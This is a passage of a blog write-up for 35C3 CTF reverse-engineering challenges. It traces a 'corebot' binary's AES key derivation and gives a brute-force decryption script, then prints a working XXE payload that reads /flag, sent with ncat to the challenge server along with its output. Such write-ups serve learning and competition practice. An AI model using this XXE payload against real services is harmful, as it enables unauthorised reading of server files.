PROV_DSS 3</span><br><span class="line">#define PROV_FORTEZZA 4</span><br><span class="line">#define PROV_MS_MAIL 5</span><br><span class="line">#define PROV_SSL 6</span><br><span class="line">#define PROV_STT_MER 7</span><br><span class="line">#define PROV_STT_ACQ 8</span><br><span class="line">#define PROV_STT_BRND 9</span><br><span class="line">#define PROV_STT_ROOT 10</span><br><span class="line">#define PROV_STT_ISS 11</span><br><span class="line">#define PROV_RSA_SCHANNEL 12</span><br><span class="line">#define PROV_DSS_DH 13</span><br><span class="line">#define PROV_EC_ECDSA_SIG 14</span><br><span class="line">#define PROV_EC_ECNRA_SIG 15</span><br><span class="line">#define PROV_EC_ECDSA_FULL 16</span><br><span class="line">#define PROV_EC_ECNRA_FULL 17</span><br><span class="line">#define PROV_DH_SCHANNEL 18</span><br><span class="line">#define PROV_SPYRUS_LYNKS 20</span><br><span class="line">#define PROV_RNG 21</span><br><span class="line">#define PROV_INTEL_SEC 22</span><br><span class="line">#define PROV_REPLACE_OWF 23</span><br><span class="line">#define PROV_RSA_AES 24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:01101180                 pop     ebx</span><br><span class="line">.text:01101181                 push    0</span><br><span class="line">.text:01101183                 mov     eax, esp</span><br><span class="line">.text:01101185                 push    0               ; nFileSystemNameSize</span><br><span class="line">.text:01101187                 push    0               ; lpFileSystemNameBuffer</span><br><span class="line">.text:01101189                 push    0               ; lpFileSystemFlags</span><br><span class="line">.text:0110118B                 push    0               ; lpMaximumComponentLength</span><br><span class="line">.text:0110118D                 push    eax             ; lpVolumeSerialNumber</span><br><span class="line">.text:0110118E                 push    0               ; nVolumeNameSize</span><br><span class="line">.text:01101190                 push    0               ; lpVolumeNameBuffer</span><br><span class="line">.text:01101192                 push    0               ; lpRootPathName</span><br><span class="line">.text:01101194                 call    GetVolumeInformationA</span><br></pre></td></tr></table></figure>
+<p><strong>create key in stack:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0110119F loc_110119F:                            ; CODE XREF: start+4B↓j</span><br><span class="line">.text:0110119F                 push    ax</span><br><span class="line">.text:011011A1                 movzx   esi, ax</span><br><span class="line">.text:011011A4                 mov     edx, esi</span><br><span class="line">.text:011011A6                 shl     edx, 7</span><br><span class="line">.text:011011A9                 xor     eax, edx</span><br><span class="line">.text:011011AB                 mov     edx, esi</span><br><span class="line">.text:011011AD                 shl     edx, 0Bh</span><br><span class="line">.text:011011B0                 xor     eax, edx</span><br><span class="line">.text:011011B2                 mov     edx, esi</span><br><span class="line">.text:011011B4                 shr     edx, 4</span><br><span class="line">.text:011011B7                 xor     eax, edx</span><br><span class="line">.text:011011B9                 loop    loc_110119F</span><br></pre></td></tr></table></figure>
+<p><strong>create header of pbData in stack&amp;&amp;call   CryptImportKey:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pbData:</span><br><span class="line">.text:011011BB                 push    20h         ;The length of key:</span><br><span class="line">.text:011011BD                 push    6610h       ;CALG_AES_256</span><br><span class="line">.text:011011C2                 push    small 0</span><br><span class="line">.text:011011C5                 push    small 208h  ;Blob Header</span><br><span class="line">.text:011011C9                 mov     ebp, esp</span><br><span class="line">......</span><br><span class="line">.text:011011D4                 push    ebp         ;*pbData</span><br><span class="line">more information of CALG_AES_256:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;desktop&#x2F;SecCrypto&#x2F;alg-id</span><br><span class="line">#pbData:</span><br><span class="line">08 02 00 00   #header</span><br><span class="line">10 66 00 00   #CALG_AES_256</span><br><span class="line">20 00 00 00   #size of key</span><br><span class="line">......~~~     #data of key</span><br></pre></td></tr></table></figure>
+<p><strong>set some MODE:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:011011DB                 pop     ebx</span><br><span class="line"></span><br><span class="line">#CRYPT_MODE_ECB:</span><br><span class="line">.text:011011DC                 push    2</span><br><span class="line">.text:011011DE                 mov     eax, esp</span><br><span class="line"></span><br><span class="line">.text:011011E0                 push    0               ; dwFlags</span><br><span class="line">.text:011011E2                 push    eax             ; pbData</span><br><span class="line"></span><br><span class="line">#KP_MODE:</span><br><span class="line">.text:011011E3                 push    4               ; dwParam</span><br><span class="line"></span><br><span class="line">.text:011011E5                 push    ebx             ; hKey</span><br><span class="line">.text:011011E6                 call    CryptSetKeyParam</span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">#define CRYPT_MODE_CBC 1</span><br><span class="line">#define CRYPT_MODE_ECB 2</span><br><span class="line">#define CRYPT_MODE_OFB 3</span><br><span class="line">#define CRYPT_MODE_CFB 4</span><br><span class="line">#define CRYPT_MODE_CTS 5</span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">#define KP_IV 1</span><br><span class="line">#define KP_SALT 2</span><br><span class="line">#define KP_PADDING 3</span><br><span class="line">#define KP_MODE 4</span><br><span class="line">#define KP_MODE_BITS 5</span><br><span class="line">#define KP_PERMISSIONS 6</span><br><span class="line">#define KP_ALGID 7</span><br><span class="line">#define KP_BLOCKLEN 8</span><br><span class="line">---------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p><strong>Decrypt:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:011011EB                 add     esp, 4</span><br><span class="line">.text:011011EE                 call    sub_1101146</span><br><span class="line">.text:011011F3                 mov     esi, eax</span><br><span class="line">.text:011011F5                 sub     esp, edx</span><br><span class="line">.text:011011F7                 mov     edi, esp</span><br><span class="line">.text:011011F9                 mov     ecx, edx</span><br><span class="line">.text:011011FB                 rep movsb</span><br><span class="line">.text:011011FD                 sub     edi, edx</span><br><span class="line">.text:011011FF                 push    edx</span><br><span class="line">.text:01101200                 mov     eax, esp</span><br><span class="line">.text:01101202                 push    eax             ; pdwDataLen</span><br><span class="line">.text:01101203                 push    edi             ; pbData</span><br><span class="line">.text:01101204                 push    0               ; dwFlags</span><br><span class="line">.text:01101206                 push    1               ; Final</span><br><span class="line">.text:01101208                 push    0               ; hHash</span><br><span class="line">.text:0110120A                 push    ebx             ; hKey</span><br><span class="line">.text:0110120B                 call    CryptDecrypt</span><br></pre></td></tr></table></figure>
+<p><strong>compare strings with Begin four bytes：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:01101210                 cmp     dword ptr [edi], 33433533h</span><br><span class="line">.text:01101216                 jz      short loc_1101223</span><br><span class="line">.text:01101218                 push    small 0A2Eh</span><br><span class="line">.text:0110121C                 push    45504F4Eh</span><br><span class="line">.text:01101221                 mov     edi, esp</span><br><span class="line">.text:01101223</span><br><span class="line">.text:01101223 loc_1101223:                            ; CODE XREF: start+A8↑j</span><br><span class="line">.text:01101223                 call    sub_1101120</span><br><span class="line">.text:01101228                 push    0               ; uExitCode</span><br><span class="line">.text:0110122A                 call    ExitProcess</span><br></pre></td></tr></table></figure>
+<p><strong>至此未确定的只有初始用于生成Key的GetVolumeInformationA返回的2 bytes未知，直接爆力破解即可：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">K &#x3D;[16, 41, 184,  69, 157,  42, 171, 147, 254, 137, 251, 130, 147,  66, 161, 140,  46, 144, 99, 0,  6,  17, 128, 100, 184,  33, 194, 159,  53, 231,  126, 242,   8,   2,   0,   0,  16, 102, 0, 0, 32,   0,   0,   0]</span><br><span class="line">text&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0x20):</span><br><span class="line">    text+&#x3D;chr(K[i])</span><br><span class="line"></span><br><span class="line">for i in range(0x10000):</span><br><span class="line">    key &#x3D; &quot;&quot;</span><br><span class="line">    for j in range(16):</span><br><span class="line">        key &#x3D; chr(i&amp;0xff)+chr((i&amp;0xffff)&gt;&gt;8)+key;</span><br><span class="line">        i ^&#x3D; ((i &amp; 0xffff) &gt;&gt; 4) ^ ((i &amp; 0xffff) &lt;&lt; 11) ^ ((i &amp; 0xffff) &lt;&lt; 7)</span><br><span class="line">    decode &#x3D; AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ans &#x3D; decode.decrypt(text)</span><br><span class="line">    if ans[:4] &#x3D;&#x3D; &#39;35C3&#39;:</span><br><span class="line">        print ans</span><br><span class="line">#35C3_MalwareAuthorKryptoChef</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-juggle"><a href="#0x04-juggle" class="headerlink" title="0x04 juggle"></a>0x04 juggle</h3><p><strong>基本的XXE即可bypass</strong><br><strong>solution.xml:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY kirin SYSTEM &quot;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;text&gt;&amp;kirin;&lt;&#x2F;text&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;35C3_The_chef_gives_you_his_compliments</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-0pack"><span class="toc-number">1.</span> <span class="toc-text">0x01 0pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-box-of-blink"><span class="toc-number">2.</span> <span class="toc-text">0x02 box of blink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-corebot"><span class="toc-number">3.</span> <span class="toc-text">0x03 corebot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-juggle"><span class="toc-number">4.</span> <span class="toc-text">0x04 juggle</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/15/35C3-Re/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/15/35C3-Re/&text=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/15/35C3-Re/&is_video=false&description=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=35C3_Re&body=Check out this article: http://yoursite.com/2019/01/15/35C3-Re/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/15/35C3-Re/&title=35C3_Re" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/15/35C3-Re/&name=35C3_Re&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
